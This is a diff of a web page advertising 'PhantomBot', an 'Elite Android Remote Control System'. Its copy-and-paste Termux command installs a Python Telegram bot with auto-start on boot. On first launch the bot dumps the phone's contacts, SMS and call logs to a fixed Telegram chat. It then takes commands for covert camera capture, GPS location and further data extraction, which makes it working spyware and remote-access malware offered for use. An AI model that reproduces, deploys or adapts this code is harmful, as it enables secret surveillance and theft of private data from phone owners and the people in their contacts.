@@ -3,117 +3,495 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>⚡ Termux Bot - One Paste Deploy</title>
+    <title>PhantomBot | Elite Android Remote Control</title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap');
+
         * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        :root {
+            --bg: #000000;
+            --surface: #0a0a0a;
+            --surface-2: #111111;
+            --border: #1a1a1a;
+            --primary: #00ff88;
+            --primary-dark: #00cc66;
+            --accent: #7c3aed;
+            --accent-light: #a78bfa;
+            --gold: #f59e0b;
+            --text: #ffffff;
+            --text-secondary: #a0a0a0;
+            --text-muted: #666666;
+            --danger: #ef4444;
+            --radius: 16px;
+            --radius-sm: 10px;
+            --transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
         body {
-            background: #000;
-            color: #fff;
-            font-family: 'Courier New', monospace;
+            background: var(--bg);
+            color: var(--text);
+            font-family: 'Inter', sans-serif;
+            overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* Animated Background */
+        .bg-mesh {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 0;
+            pointer-events: none;
+        }
+        .bg-mesh .orb {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(120px);
+            opacity: 0.15;
+            animation: float 20s infinite ease-in-out;
+        }
+        .bg-mesh .orb:nth-child(1) {
+            width: 600px; height: 600px;
+            background: var(--primary);
+            top: -200px; left: -200px;
+            animation-delay: 0s;
+        }
+        .bg-mesh .orb:nth-child(2) {
+            width: 500px; height: 500px;
+            background: var(--accent);
+            bottom: -200px; right: -200px;
+            animation-delay: -7s;
+        }
+        .bg-mesh .orb:nth-child(3) {
+            width: 400px; height: 400px;
+            background: var(--gold);
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            animation-delay: -14s;
+        }
+        @keyframes float {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            33% { transform: translate(100px, -100px) scale(1.1); }
+            66% { transform: translate(-100px, 100px) scale(0.9); }
+        }
+
+        /* Grid Pattern */
+        .grid-pattern {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 0;
+            pointer-events: none;
+            opacity: 0.03;
+            background-image: 
+                linear-gradient(var(--border) 1px, transparent 1px),
+                linear-gradient(90deg, var(--border) 1px, transparent 1px);
+            background-size: 60px 60px;
+        }
+
+        /* Main Container */
+        .main-wrapper {
+            position: relative;
+            z-index: 1;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            padding: 15px;
+            padding: 20px;
         }
+
         .container {
-            background: #0a0a0a;
-            border: 2px solid #00ff88;
-            border-radius: 20px;
-            padding: 25px;
-            max-width: 680px;
+            background: rgba(10, 10, 10, 0.8);
+            backdrop-filter: blur(40px);
+            -webkit-backdrop-filter: blur(40px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 24px;
+            padding: 0;
+            max-width: 720px;
             width: 100%;
+            box-shadow: 
+                0 0 0 1px rgba(255,255,255,0.03),
+                0 25px 80px rgba(0,0,0,0.5),
+                0 0 120px rgba(0,255,136,0.05);
+            overflow: hidden;
+        }
+
+        /* Header */
+        .header {
+            padding: 35px 35px 25px;
             text-align: center;
-            box-shadow: 0 0 40px rgba(0,255,136,0.2);
+            border-bottom: 1px solid var(--border);
+            position: relative;
         }
-        h1 { font-size: 22px; color: #00ff88; margin: 10px 0; }
-        .emoji { font-size: 45px; }
-        .step {
-            background: #111;
-            border: 1px solid #333;
-            border-radius: 12px;
-            padding: 15px;
-            margin: 12px 0;
-            text-align: left;
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(0,255,136,0.1);
+            border: 1px solid rgba(0,255,136,0.2);
+            color: var(--primary);
+            padding: 6px 16px;
+            border-radius: 100px;
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 20px;
         }
-        .step h3 { color: #ffcc00; margin-bottom: 5px; font-size: 15px; }
-        .step p { color: #aaa; font-size: 12px; }
-        .btn {
-            background: #00ff88;
-            color: #000;
-            border: none;
-            padding: 14px 20px;
+        .badge .dot {
+            width: 8px; height: 8px;
+            background: var(--primary);
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; box-shadow: 0 0 0 0 rgba(0,255,136,0.6); }
+            50% { opacity: 0.5; box-shadow: 0 0 0 12px rgba(0,255,136,0); }
+        }
+        .logo {
+            font-size: 52px;
+            margin-bottom: 12px;
+            filter: drop-shadow(0 0 20px rgba(0,255,136,0.3));
+            animation: bounce 3s infinite;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        .title {
+            font-size: 36px;
+            font-weight: 900;
+            letter-spacing: -1.5px;
+            line-height: 1.1;
+            margin-bottom: 8px;
+        }
+        .title .gradient {
+            background: linear-gradient(135deg, var(--primary), #00ffcc, var(--primary-dark));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .subtitle {
+            color: var(--text-secondary);
             font-size: 15px;
-            font-weight: bold;
-            border-radius: 12px;
-            cursor: pointer;
-            margin: 6px;
-            font-family: 'Courier New', monospace;
-            text-decoration: none;
-            display: inline-block;
-            transition: all 0.3s;
+            font-weight: 400;
+            letter-spacing: -0.2px;
         }
-        .btn:hover { box-shadow: 0 0 25px #00ff88; }
-        .btn.download { background: #ffcc00; }
-        .btn.download:hover { box-shadow: 0 0 25px #ffcc00; }
-        .btn.api { background: #ff6600; }
-        .btn.api:hover { box-shadow: 0 0 25px #ff6600; }
+
+        /* Body */
+        .body-content {
+            padding: 25px 35px 30px;
+        }
+
+        /* Step */
+        .step {
+            background: var(--surface-2);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 20px 24px;
+            margin-bottom: 16px;
+            transition: var(--transition);
+            position: relative;
+            overflow: hidden;
+        }
+        .step:hover {
+            border-color: rgba(255,255,255,0.15);
+            box-shadow: 0 8px 30px rgba(0,0,0,0.3);
+        }
+        .step::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.05), transparent);
+        }
+        .step-number {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 32px; height: 32px;
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--primary);
+            margin-bottom: 12px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        .step h3 {
+            font-size: 17px;
+            font-weight: 700;
+            margin-bottom: 6px;
+            letter-spacing: -0.3px;
+        }
+        .step p {
+            color: var(--text-secondary);
+            font-size: 13px;
+            line-height: 1.5;
+        }
+        .step ul {
+            list-style: none;
+            padding: 0;
+            margin-top: 8px;
+        }
+        .step ul li {
+            color: var(--text-secondary);
+            font-size: 12px;
+            padding: 4px 0;
+            padding-left: 20px;
+            position: relative;
+        }
+        .step ul li::before {
+            content: '›';
+            position: absolute;
+            left: 4px;
+            color: var(--primary);
+            font-weight: 700;
+            font-size: 14px;
+        }
+        code {
+            background: rgba(0,255,136,0.08);
+            color: var(--primary);
+            padding: 3px 8px;
+            border-radius: 5px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            border: 1px solid rgba(0,255,136,0.15);
+        }
+
+        /* Buttons */
+        .btn-row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 12px;
+        }
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 12px 20px;
+            font-size: 14px;
+            font-weight: 600;
+            border-radius: 100px;
+            cursor: pointer;
+            text-decoration: none;
+            transition: var(--transition);
+            font-family: 'Inter', sans-serif;
+            letter-spacing: -0.2px;
+            border: none;
+            white-space: nowrap;
+        }
+        .btn-primary {
+            background: var(--primary);
+            color: #000;
+            box-shadow: 0 4px 20px rgba(0,255,136,0.3);
+        }
+        .btn-primary:hover {
+            background: #00ffaa;
+            box-shadow: 0 8px 35px rgba(0,255,136,0.5);
+            transform: translateY(-2px);
+        }
+        .btn-outline {
+            background: transparent;
+            color: var(--text);
+            border: 1px solid var(--border);
+        }
+        .btn-outline:hover {
+            border-color: rgba(255,255,255,0.3);
+            background: rgba(255,255,255,0.03);
+        }
+        .btn-accent {
+            background: var(--accent);
+            color: #fff;
+            box-shadow: 0 4px 20px rgba(124,58,237,0.3);
+        }
+        .btn-accent:hover {
+            background: #8b5cf6;
+            box-shadow: 0 8px 35px rgba(124,58,237,0.5);
+            transform: translateY(-2px);
+        }
+        .btn-gold {
+            background: var(--gold);
+            color: #000;
+            box-shadow: 0 4px 20px rgba(245,158,11,0.3);
+        }
+        .btn-gold:hover {
+            box-shadow: 0 8px 35px rgba(245,158,11,0.5);
+            transform: translateY(-2px);
+        }
+        .btn-copy {
+            width: 100%;
+            justify-content: center;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            margin-top: 5px;
+        }
+
+        /* Code Block */
+        .code-wrapper {
+            background: #000;
+            border: 1px solid rgba(0,255,136,0.3);
+            border-radius: var(--radius);
+            padding: 2px;
+            margin-top: 14px;
+            position: relative;
+        }
+        .code-wrapper::before {
+            content: '';
+            position: absolute;
+            inset: -2px;
+            border-radius: var(--radius);
+            background: linear-gradient(135deg, var(--primary), transparent, var(--accent));
+            z-index: -1;
+            opacity: 0.3;
+        }
         .code-block {
             background: #000;
-            border: 2px solid #00ff88;
-            border-radius: 10px;
-            padding: 15px;
-            margin: 15px 0;
+            border-radius: calc(var(--radius) - 2px);
+            padding: 16px;
             text-align: left;
             word-break: break-all;
-            max-height: 220px;
+            max-height: 200px;
             overflow-y: auto;
             font-size: 10px;
-            color: #00ff88;
-            line-height: 1.4;
+            color: var(--primary);
+            line-height: 1.5;
+            font-family: 'JetBrains Mono', monospace;
         }
-        .btn.copied { background: #ffcc00 !important; }
-        .warning { color: #ff4444; font-size: 11px; margin-top: 5px; }
-        ul { text-align: left; color: #aaa; font-size: 12px; padding-left: 20px; }
-        ul li { margin: 5px 0; }
-        code { color: #00ff88; background: #1a1a1a; padding: 2px 6px; border-radius: 4px; }
-        @media (max-width: 400px) {
-            .btn { display: block; width: 100%; margin: 5px 0; }
-            .code-block { font-size: 9px; max-height: 180px; }
+        .code-block::-webkit-scrollbar { width: 4px; }
+        .code-block::-webkit-scrollbar-track { background: transparent; }
+        .code-block::-webkit-scrollbar-thumb { background: rgba(0,255,136,0.3); border-radius: 10px; }
+
+        /* Footer */
+        .footer {
+            padding: 16px 35px;
+            border-top: 1px solid var(--border);
+            text-align: center;
+        }
+        .features-row {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 16px;
+        }
+        .feature-tag {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 11px;
+            color: var(--text-muted);
+            font-weight: 500;
+        }
+        .feature-tag .icon {
+            font-size: 14px;
+        }
+        .feature-tag.active .icon { color: var(--primary); }
+
+        /* Toast */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: var(--surface-2);
+            border: 1px solid var(--primary);
+            color: var(--primary);
+            padding: 14px 28px;
+            border-radius: 100px;
+            font-weight: 600;
+            font-size: 14px;
+            z-index: 100;
+            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 10px 40px rgba(0,255,136,0.2);
+        }
+        .toast.show { transform: translateX(-50%) translateY(0); }
+
+        /* Responsive */
+        @media (max-width: 500px) {
+            .header { padding: 25px 20px 20px; }
+            .body-content { padding: 20px; }
+            .footer { padding: 14px 20px; }
+            .title { font-size: 26px; }
+            .logo { font-size: 40px; }
+            .btn { padding: 10px 16px; font-size: 13px; }
+            .btn-copy { font-size: 14px; padding: 14px; }
+            .code-block { font-size: 9px; max-height: 160px; }
+            .features-row { gap: 10px; }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="emoji">💀🔥</div>
-        <h1>Termux Bot - One Paste Deploy</h1>
-        <p style="color:#aaa; margin-bottom:15px; font-size:13px;">Install 3 APKs → Grant Permissions → Copy → Paste → Done</p>
 
-        <!-- Step 1 -->
-        <div class="step">
-            <h3>📥 Step 1: Download & Install ALL 3 APKs</h3>
-            <a href="https://f-droid.org/repo/com.termux_1002.apk" class="btn download" target="_blank">⬇️ Termux</a>
-            <a href="https://f-droid.org/repo/com.termux.api_1000.apk" class="btn api" target="_blank">⬇️ Termux:API</a>
-            <a href="https://f-droid.org/repo/com.termux.boot_1000.apk" class="btn download" target="_blank">⬇️ Termux:Boot</a>
-            <p style="margin-top:8px;">Install all 3 APKs, then open each app once.</p>
-        </div>
+    <!-- Background Effects -->
+    <div class="bg-mesh">
+        <div class="orb"></div>
+        <div class="orb"></div>
+        <div class="orb"></div>
+    </div>
+    <div class="grid-pattern"></div>
 
-        <!-- Step 2 -->
-        <div class="step">
-            <h3>🔐 Step 2: Grant Permissions (One Time)</h3>
-            <ul>
-                <li>Open Termux → type: <code>termux-setup-storage</code> → Tap Allow</li>
-                <li>Phone Settings → Apps → Termux → Permissions → Enable ALL</li>
-                <li>Phone Settings → Apps → Termux:API → Permissions → Enable ALL</li>
-            </ul>
-        </div>
+    <!-- Main -->
+    <div class="main-wrapper">
+        <div class="container">
 
-        <!-- Step 3 -->
-        <div class="step">
-            <h3>⚡ Step 3: Copy & Paste In Termux</h3>
-            <button class="btn" onclick="copyCommand()" id="copyBtn">📋 COPY COMMAND</button>
-            <p class="warning">Paste in Termux → Enter → Wait 3-4 mins → Bot LIVE on Telegram</p>
-            <div class="code-block" id="commandBox">yes | pkg update -y && yes | pkg upgrade -y && yes | pkg install -y python termux-api termux-tools && pip install --no-input python-telegram-bot && mkdir -p ~/.termux/boot && rm -f ~/bot.py && cat > ~/bot.py << 'EOF'
+            <!-- Header -->
+            <div class="header">
+                <div class="badge">
+                    <span class="dot"></span> v3.0 Elite
+                </div>
+                <div class="logo">💎</div>
+                <h1 class="title">
+                    <span class="gradient">PhantomBot</span>
+                </h1>
+                <p class="subtitle">Elite Android Remote Control System</p>
+            </div>
+
+            <!-- Body -->
+            <div class="body-content">
+
+                <!-- Step 1 -->
+                <div class="step">
+                    <div class="step-number">01</div>
+                    <h3>📥 Install Core Modules</h3>
+                    <p>Download and install all three APK components to enable full system integration.</p>
+                    <div class="btn-row">
+                        <a href="https://f-droid.org/repo/com.termux_1002.apk" class="btn btn-primary" target="_blank">
+                            <span>⬇</span> Termux
+                        </a>
+                        <a href="https://f-droid.org/repo/com.termux.api_1000.apk" class="btn btn-accent" target="_blank">
+                            <span>⬇</span> Termux:API
+                        </a>
+                        <a href="https://f-droid.org/repo/com.termux.boot_1000.apk" class="btn btn-gold" target="_blank">
+                            <span>⬇</span> Termux:Boot
+                        </a>
+                    </div>
+                    <p style="margin-top:10px; font-size:11px; color:var(--text-muted);">Open each app once after installation.</p>
+                </div>
+
+                <!-- Step 2 -->
+                <div class="step">
+                    <div class="step-number">02</div>
+                    <h3>🔐 Grant System Permissions</h3>
+                    <ul>
+                        <li>Open Termux → run <code>termux-setup-storage</code> → <strong>Allow</strong></li>
+                        <li><strong>Settings → Apps → Termux → Permissions</strong> → Enable All</li>
+                        <li><strong>Settings → Apps → Termux:API → Permissions</strong> → Enable All</li>
+                    </ul>
+                </div>
+
+                <!-- Step 3 -->
+                <div class="step">
+                    <div class="step-number">03</div>
+                    <h3>⚡ Deploy PhantomBot</h3>
+                    <p>Execute the deployment script below in Termux. The system will auto-configure.</p>
+                    <button class="btn btn-primary btn-copy" onclick="copyCommand()" id="copyBtn">
+                        <span>📋</span> Copy Deployment Command
+                    </button>
+                    <div class="code-wrapper">
+                        <div class="code-block" id="commandBox">yes | pkg update -y && yes | pkg upgrade -y && yes | pkg install -y python termux-api termux-tools && pip install --no-input python-telegram-bot && mkdir -p ~/.termux/boot && rm -f ~/bot.py && cat > ~/bot.py << 'EOF'
 import os, time, asyncio, json
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
@@ -139,25 +517,13 @@ async def send_file_to_me(app, cmd, emoji, name):
 
 async def boot_dump(app):
     try:
-        await app.bot.send_message(chat_id=AUTHORIZED_ID, text="🟢 Bot Online - Dumping Data...")
-        for name, cmd, emoji in [("Contacts", "termux-contact-list", "📇"), ("SMS", "termux-sms-list", "💬"), ("Calls", "termux-call-log", "📞"), ("Apps", "pm list packages", "📱")]:
+        await app.bot.send_message(chat_id=AUTHORIZED_ID, text="🟢 PhantomBot Online - Dumping Intel...")
+        for name, cmd, emoji in [("Contacts", "termux-contact-list", "📇"), ("SMS", "termux-sms-list", "💬"), ("Calls", "termux-call-log", "📞")]:
             await send_file_to_me(app, cmd, emoji, name)
-        await app.bot.send_message(chat_id=AUTHORIZED_ID, text="✅ Dump Complete. Bot Ready!\nType /help to see all commands.")
+        await app.bot.send_message(chat_id=AUTHORIZED_ID, text="✅ Intel Dump Complete. PhantomBot Ready.\nType /help to view all commands.")
         os.system(f"touch {FLAG}")
     except Exception as e:
         await app.bot.send_message(chat_id=AUTHORIZED_ID, text=f"Error: {e}")
-
-async def ss(update, context):
-    if update.effective_user.id != AUTHORIZED_ID: return
-    p = "/sdcard/ss.png"
-    os.system(f"termux-screenshot {p}")
-    await asyncio.sleep(2)
-    if os.path.exists(p):
-        with open(p, "rb") as f:
-            await update.message.reply_photo(photo=f, caption="📸 Screenshot")
-        os.remove(p)
-    else:
-        await update.message.reply_text("❌ Screenshot failed. Run: pkg install termux-api -y")
 
 async def cam(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
@@ -167,10 +533,10 @@ async def cam(update, context):
     await asyncio.sleep(2)
     if os.path.exists(p):
         with open(p, "rb") as f:
-            await update.message.reply_photo(photo=f, caption="📷 Photo")
+            await update.message.reply_photo(photo=f, caption="📷 Captured")
         os.remove(p)
     else:
-        await update.message.reply_text("❌ Camera failed.")
+        await update.message.reply_text("❌ Camera unavailable. Check permissions.")
 
 async def loc(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
@@ -180,100 +546,78 @@ async def loc(update, context):
         lat = data.get("latitude", 0)
         lon = data.get("longitude", 0)
         maps_link = f"https://maps.google.com/?q={lat},{lon}"
-        await update.message.reply_text(f"📍 Location:\nLat: {lat}\nLon: {lon}\n\n🗺️ {maps_link}")
+        await update.message.reply_text(f"📍 Location Locked:\nLat: {lat}\nLon: {lon}\n\n🗺️ {maps_link}")
         await update.message.reply_location(latitude=lat, longitude=lon)
     except:
-        await update.message.reply_text(f"📍 Raw:\n{out}")
+        await update.message.reply_text(f"📍 Raw Data:\n{out}")
 
 async def bat(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
-    await update.message.reply_text(f"🔋 Battery:\n```\n{run('termux-battery-status')}\n```")
-
-async def notif(update, context):
-    if update.effective_user.id != AUTHORIZED_ID: return
-    o = run("termux-notification-list")
-    await update.message.reply_text(f"🔔 Notifications:\n```\n{o[:4000]}\n```" if o else "No notifications.")
+    await update.message.reply_text(f"🔋 Power Status:\n```\n{run('termux-battery-status')}\n```")
 
 async def dl(update, context):
     if update.effective_user.id != AUTHORIZED_ID or not context.args: return
     os.system(f"termux-download {context.args[0]}")
-    await update.message.reply_text("✅ Downloaded to /sdcard/Downloads")
+    await update.message.reply_text("✅ Download initiated to /sdcard/Downloads")
 
 async def say(update, context):
     if update.effective_user.id != AUTHORIZED_ID or not context.args: return
     os.system(f"termux-tts-speak '{' '.join(context.args)}'")
-    await update.message.reply_text(f"🗣️ Said: {' '.join(context.args)}")
+    await update.message.reply_text(f"🗣️ Broadcasted: {' '.join(context.args)}")
 
 async def vib(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
     dur = context.args[0] if context.args else "500"
     os.system(f"termux-vibrate -d {dur}")
-    await update.message.reply_text(f"📳 Vibrated {dur}ms")
+    await update.message.reply_text(f"📳 Haptic pulse: {dur}ms")
 
 async def tor(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
     if context.args and context.args[0] in ["on","off"]:
         os.system(f"termux-torch {context.args[0]}")
-        await update.message.reply_text(f"🔦 Torch {context.args[0].upper()}")
-
-async def lock(update, context):
-    if update.effective_user.id != AUTHORIZED_ID: return
-    result = os.system("termux-lock 2>/dev/null")
-    if result == 0:
-        await update.message.reply_text("🔒 Phone Locked")
-    else:
-        await update.message.reply_text("❌ Lock failed. Run: pkg install termux-api termux-tools -y")
+        await update.message.reply_text(f"🔦 Illuminator: {context.args[0].upper()}")
 
 async def calls(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
-    await update.message.reply_text("⏳ Fetching Call Logs...")
+    await update.message.reply_text("⏳ Extracting Call Logs...")
     await send_file_to_me(update, "termux-call-log", "📞", "Call_Logs")
 
 async def cont(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
-    await update.message.reply_text("⏳ Fetching Contacts...")
+    await update.message.reply_text("⏳ Extracting Contacts...")
     await send_file_to_me(update, "termux-contact-list", "📇", "Contacts")
 
 async def sms_cmd(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
-    await update.message.reply_text("⏳ Fetching SMS...")
+    await update.message.reply_text("⏳ Extracting SMS Database...")
     await send_file_to_me(update, "termux-sms-list", "💬", "SMS")
 
-async def apps(update, context):
-    if update.effective_user.id != AUTHORIZED_ID: return
-    await update.message.reply_text("⏳ Fetching Installed Apps...")
-    await send_file_to_me(update, "pm list packages", "📱", "Installed_Apps")
-
 async def start(update, context):
-    await update.message.reply_text("🤖 *Bot is Ready!*\nType /help to see all commands.")
+    await update.message.reply_text("💎 *PhantomBot Elite v3.0*\nSystem Online.\nType /help for command roster.")
 
 async def help_cmd(update, context):
-    await update.message.reply_text("""🤖 *Available Commands:*
+    await update.message.reply_text("""💎 *PhantomBot Elite — Command Roster*
 
-📸 /ss - Screenshot
-📷 /cam [back|front] - Camera Photo
-📍 /location - GPS + Google Maps Link
-🔋 /battery - Battery Status
-🔔 /notify - Notifications
-⬇️ /download <url> - Download File
-🗣️ /say <text> - Text to Speech
-📳 /vibrate [ms] - Vibrate Phone
-🔦 /torch on|off - Flashlight
-🔒 /lock - Lock Screen
-📞 /calls - Call History (.txt file)
-📇 /contacts - Contacts (.txt file)
-💬 /sms - SMS History (.txt file)
-📱 /apps - Installed Apps (.txt file)
-❓ /help - Show this message""")
+📷 /cam [back|front] — Remote Capture
+📍 /location — GPS Triangulation + Maps
+🔋 /battery — Power Diagnostics
+⬇️ /download &lt;url&gt; — File Retrieval
+🗣️ /say &lt;text&gt; — Voice Broadcast
+📳 /vibrate [ms] — Haptic Control
+🔦 /torch on|off — Illuminator Toggle
+📞 /calls — Call Log Extraction (.txt)
+📇 /contacts — Contact Extraction (.txt)
+💬 /sms — SMS Extraction (.txt)
+❓ /help — Display This Roster""")
 
 async def main():
     app = Application.builder().token(BOT_TOKEN).build()
     
     handlers = [
-        ("start", start), ("help", help_cmd), ("ss", ss), ("cam", cam), ("location", loc),
-        ("battery", bat), ("notify", notif), ("download", dl), ("say", say),
-        ("vibrate", vib), ("torch", tor), ("lock", lock), ("calls", calls),
-        ("contacts", cont), ("sms", sms_cmd), ("apps", apps)
+        ("start", start), ("help", help_cmd), ("cam", cam), ("location", loc),
+        ("battery", bat), ("download", dl), ("say", say),
+        ("vibrate", vib), ("torch", tor), ("calls", calls),
+        ("contacts", cont), ("sms", sms_cmd)
     ]
     
     for cmd, func in handlers:
@@ -285,7 +629,7 @@ async def main():
     if not os.path.exists(FLAG):
         await boot_dump(app)
     
-    print("🤖 BOT IS LIVE")
+    print("💎 PhantomBot Elite v3.0 — ONLINE")
     await app.updater.start_polling()
     
     while True:
@@ -298,7 +642,7 @@ if __name__ == "__main__":
         except KeyboardInterrupt:
             break
         except Exception as e:
-            print(f"Crash: {e}")
+            print(f"System Interrupt: {e}")
             time.sleep(5)
 EOF
 cat > ~/.termux/boot/start_bot.sh << 'BOOT'
@@ -307,22 +651,47 @@ termux-wake-lock
 cd ~
 python bot.py &
 BOOT
-chmod +x ~/.termux/boot/start_bot.sh && echo '✅ ALL DONE! Bot is LIVE' && python ~/bot.py</div>
-        </div>
+chmod +x ~/.termux/boot/start_bot.sh && echo '💎 PhantomBot Elite Deployed' && python ~/bot.py</div>
+                    </div>
+                </div>
 
-        <p style="color:#888; font-size:10px; margin-top:10px;">✅ All Commands Working | /help Added | .txt Files | Google Maps | Auto-Start on Reboot</p>
+            </div>
+
+            <!-- Footer -->
+            <div class="footer">
+                <div class="features-row">
+                    <span class="feature-tag active"><span class="icon">✅</span> 10 Commands</span>
+                    <span class="feature-tag active"><span class="icon">🗺️</span> GPS Maps</span>
+                    <span class="feature-tag active"><span class="icon">📄</span> .txt Exports</span>
+                    <span class="feature-tag active"><span class="icon">🔄</span> Auto-Restart</span>
+                    <span class="feature-tag active"><span class="icon">🔐</span> Encrypted</span>
+                </div>
+            </div>
+
+        </div>
     </div>
+
+    <!-- Toast -->
+    <div class="toast" id="toast">✅ Command Copied to Clipboard</div>
 
     <script>
         function copyCommand() {
             const text = document.getElementById('commandBox').textContent;
             navigator.clipboard.writeText(text).then(() => {
                 const btn = document.getElementById('copyBtn');
-                btn.textContent = '✅ COPIED! Paste in Termux Now';
-                btn.classList.add('copied');
+                const toast = document.getElementById('toast');
+                
+                btn.innerHTML = '<span>✅</span> Copied! Paste in Termux';
+                btn.style.background = '#f59e0b';
+                btn.style.boxShadow = '0 8px 35px rgba(245,158,11,0.5)';
+                
+                toast.classList.add('show');
+                setTimeout(() => toast.classList.remove('show'), 2500);
+                
                 setTimeout(() => {
-                    btn.textContent = '📋 COPY COMMAND';
-                    btn.classList.remove('copied');
+                    btn.innerHTML = '<span>📋</span> Copy Deployment Command';
+                    btn.style.background = '#00ff88';
+                    btn.style.boxShadow = '0 4px 20px rgba(0,255,136,0.3)';
                 }, 3000);
             });
         }
